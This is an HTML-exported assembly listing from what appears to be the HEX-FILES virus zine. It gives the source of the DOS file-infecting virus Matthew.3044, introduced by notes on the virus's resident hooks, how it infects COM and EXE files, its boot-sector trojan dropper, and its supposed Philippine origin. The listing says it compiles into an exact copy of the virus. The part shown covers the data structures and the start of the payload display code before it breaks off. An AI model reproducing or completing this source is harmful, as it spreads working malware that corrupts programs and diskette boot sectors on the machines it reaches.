<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;   HEX-FILES No. 2                                                   File 011 </span><span class="sc0">
</span><span class="sc1">;  ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;                                 Matthew.3044</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Matthew goes resident as a low memory TSR (258 paras = 9600 bytes) </span><span class="sc0">
</span><span class="sc1">;     and hooks int 08, 13 and 21. It infects COM and EXE programs on EXEC </span><span class="sc0">
</span><span class="sc1">;     (21/4B00). 3044 bytes are added to the length infected programs. EXEs </span><span class="sc0">
</span><span class="sc1">;     are aligned and are further padded by 1 to 15 bytes. Matthew is found </span><span class="sc0">
</span><span class="sc1">;     at the end of EXE programs and the start of COM programs.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Matthew drops a trojan, a message popper, on boot sectors of </span><span class="sc0">
</span><span class="sc1">;     diskettes on reset disk (13/0). The trojan would display a framed </span><span class="sc0">
</span><span class="sc1">;     message, Matthew chapter 6 verse 26, and "System Disk Needed...". </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Matthew 6:26 would also be displayed on a delayed timer trigger.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     One other thing about Matthew is that pairs of NOPs are hard coded. </span><span class="sc0">
</span><span class="sc1">;     This is probably to avoid being detected as its earlier variant.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;      </span><span class="sc0">
</span><span class="sc1">;     Matthew originated from the Philippines?</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     You would not find in the virus code any direct reference to its </span><span class="sc0">
</span><span class="sc1">;     country of origin. However, I believe that Matthew was written in the </span><span class="sc0">
</span><span class="sc1">;     Philippines, Adamson University in particular.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     It is widespread in the country considering it is not a fast </span><span class="sc0">
</span><span class="sc1">;     infector. Another thing is that it has many similarities with </span><span class="sc0">
</span><span class="sc1">;     Possessed. One obvious similarity is the int 24 handler/call to old </span><span class="sc0">
</span><span class="sc1">;     int 21 handler routines. I have not seen any other virii that use </span><span class="sc0">
</span><span class="sc1">;     these two routines, other than those based on Possessed. (I have not </span><span class="sc0">
</span><span class="sc1">;     seen that many virus code though) You would also find other routines </span><span class="sc0">
</span><span class="sc1">;     in the virus that had been influenced by Possessed. </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     The way I look at this, an assembly language teacher might have asked </span><span class="sc0">
</span><span class="sc1">;     his class to create a virus based on Possessed as their project. </span><span class="sc0">
</span><span class="sc1">;     Oggo, another virus based on Possessed, appeared in the wild at </span><span class="sc0">
</span><span class="sc1">;     almost the same time as Matthew. The authors of these two virii might </span><span class="sc0">
</span><span class="sc1">;     have been classmates.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     If you know what "1st Bat.94 (Sw &amp; Sh)" means, we might be able to </span><span class="sc0">
</span><span class="sc1">;     pin down the origin of the virus. The "1st Bat.94" might refer to </span><span class="sc0">
</span><span class="sc1">;     first batch 1994. The "(Sw &amp; Sh)" part, I have no idea of. </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;     Also, if you have a copy of Matthew.2667, there might be something </span><span class="sc0">
</span><span class="sc1">;     there that can give us a clue as to the origin of the virus.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">;  ฤฤ MATT3044.ASM STARTS HERE ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ </span><span class="sc0">
 
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING                                                 WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING        overwrites diskette boot sectors         WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING                                                 WARNING*</span><span class="sc0">
 </span><span class="sc1">; *WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*WARNING*</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; Virus:  Matthew.3044</span><span class="sc0">
 </span><span class="sc1">; Alias:  Matthew, Matthiew.3044</span><span class="sc0">
 </span><span class="sc1">; Probable Origin: Adamson University, Manila, Philippines</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; This source code is written in a way so that when compiled you will </span><span class="sc0">
 </span><span class="sc1">; get an exact copy of the virus. </span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; You will only be able to duplicate the original virus if you use </span><span class="sc0">
 </span><span class="sc1">; *TASM 2.01* or *MASM 5.0* to compile this program listing. Other </span><span class="sc0">
 </span><span class="sc1">; compilers or versions of a compiler might produce a virus different </span><span class="sc0">
 </span><span class="sc1">; from that originally released.</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; This can also be compiled in a86 4.02 but you will be creating a </span><span class="sc0">
 </span><span class="sc1">; new variant.</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">; Compile to COM.</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">; Program listing created by Putoksa Kawayan.        HEX-FILES No. 2</span><span class="sc0">
 </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
 </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">ExeHeader</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">isExeId</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isMod</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isBlocks</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isRelocItemCt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isHeaderSize</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isMinAlloc</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isMaxAlloc</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isSs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isSp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isCxSum</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isIp</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">isCs</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeHeader</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0"> 
 
 </span><span class="sc5">Matthew</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Matthew</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
 </span><span class="sc5">MemoryMarkerLoc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03ech</span><span class="sc0">
 </span><span class="sc5">SaveSsOnInt21</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03e8h</span><span class="sc0">
 </span><span class="sc5">SaveSpOnInt21</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03f0h</span><span class="sc0">
 </span><span class="sc5">VirLen</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">
 </span><span class="sc5">ExecParam</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc0">
 </span><span class="sc5">MaxRow</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0">
 </span><span class="sc5">MaxColumn</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">37</span><span class="sc0">
 
 </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 
 </span><span class="sc5">MatthewEntry</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Relay1</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------- this would clear the jump instructions </span><span class="sc0">
 </span><span class="sc1">;---------------------------- if you use "type" on infected coms </span><span class="sc0">
 
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------- this message would be replaced with a fresh </span><span class="sc0">
 </span><span class="sc1">;---------------------------- copy when it goes resident</span><span class="sc0">
 
 </span><span class="sc5">MatthewMessage</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">                                        </span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0c4h</span><span class="sc4">),</span><span class="sc2">0bfh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">                                        </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Look at the birds of the air,"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">32</span><span class="sc4">),</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"they do not sow or reap or store"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"away in barns, yet your Heavenly"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Father feeds them. Are you not"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">32</span><span class="sc4">),</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"much more valuable than they?"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">32</span><span class="sc4">),</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">                                        </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0c4h</span><span class="sc4">),</span><span class="sc2">0b4h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">                                        </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"Matthew 6:26 1st Bat.94 (Sw &amp; Sh)"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">                                        </span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">35</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0c4h</span><span class="sc4">),</span><span class="sc2">0d9h</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------- this would end display if "type" is used </span><span class="sc0">
 
                         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">36</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">32</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">26</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------- virus data</span><span class="sc0">
 
 </span><span class="sc5">InfectMark1</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">92a1h</span><span class="sc0">
 </span><span class="sc5">InfectMark2</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0505h</span><span class="sc0">
 </span><span class="sc5">VirLenConst</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewEntry</span><span class="sc0">
 </span><span class="sc5">ExeBlk</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeMod</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeCs</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeIp</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeSs</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeSp</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeCxSm</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">CxSumVar</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Psp</span><span class="sc0">                     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
           </span><span class="sc5">whatsthisfor1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FileTypeFlag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
           </span><span class="sc5">whatsthisfor2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
 
 </span><span class="sc5">DosInterrupt</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">DosIntOffset</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">DosIntSegment</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">ClockInterrupt</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">ClockIntOffset</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">ClockIntSegment</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">ErrorIntOffset</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ErrorIntSegment</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">DiskInterrupt</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">DiskIntOffset</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">DiskIntSegment</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">Relay1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">PrepareForSetUp</span><span class="sc0">
 
           </span><span class="sc5">whatsthisfor3</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 
 </span><span class="sc5">HostProgram</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
   </span><span class="sc5">HostProgramOffset</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">HostProgramSegment</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc5">VirusAsciiz</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
           </span><span class="sc5">whatsthisfor4</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">36</span><span class="sc0">
 </span><span class="sc5">Handle</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Attribute</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ComLength</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">16</span><span class="sc0">
 </span><span class="sc5">AllocatedMemory</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FileDate</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">FileTime</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeLengthLo</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">ExeLengthHi</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">HostNameEnvSegment</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">HostNameEnvOffset</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">DosVersion</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Environment</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
           </span><span class="sc5">whatsthisfor5</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">ShowPayloadFlag</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">DropTrojanFlag</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">Timer</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">VideoPage</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">CursorPosition</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- payload routines</span><span class="sc0">
 
 </span><span class="sc5">GetVideoMode</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">              </span><span class="sc1">; get current video mode</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; and active video page</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">VideoPage</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">ReadCursorPosition</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">; get cusor status</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc5">VideoPage</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">CursorPosition</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">SetCursorPosition</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                </span><span class="sc1">; move cursor</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc5">VideoPage</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">ReadScreen</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc5">VideoPage</span><span class="sc0">        </span><span class="sc1">; read char and attribute</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                </span><span class="sc1">; at cursor position</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">WriteScreen</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc5">VideoPage</span><span class="sc0">        </span><span class="sc1">; write char and attribute</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">; at cursor position</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc1">;---------------------------------------- display message </span><span class="sc0">
 
 </span><span class="sc5">ShowPayload</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MatthewMessage</span><span class="sc0">      </span><span class="sc1">; set pointer to text</span><span class="sc0">
 </span><span class="sc5">WriteNextChar</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetCursorPosition</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">38</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
